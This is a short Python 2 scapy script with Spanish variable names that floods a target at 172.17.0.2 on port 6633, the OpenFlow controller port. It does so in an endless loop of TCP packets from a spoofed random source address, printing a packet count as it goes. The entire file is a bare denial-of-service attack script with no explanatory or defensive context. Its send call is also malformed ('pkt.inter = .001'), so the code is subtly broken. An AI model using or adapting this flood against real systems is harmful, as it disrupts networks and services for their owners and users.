from scapy.all import *

src = RandIP()._fix()
victima = '172.17.0.2'
puerto_ataque = 6633

numero_paquete = 1

while True:
    IP1 = IP(src=src,dst=victima)
    TCP1 = TCP(sport=puerto_ataque,dport=6633)
    pkt = IP1 / TCP1
    send(pkt.inter = .001)
    print "Paquete N: ", numero_paquete
    numero_paquete=numero_paquete+1



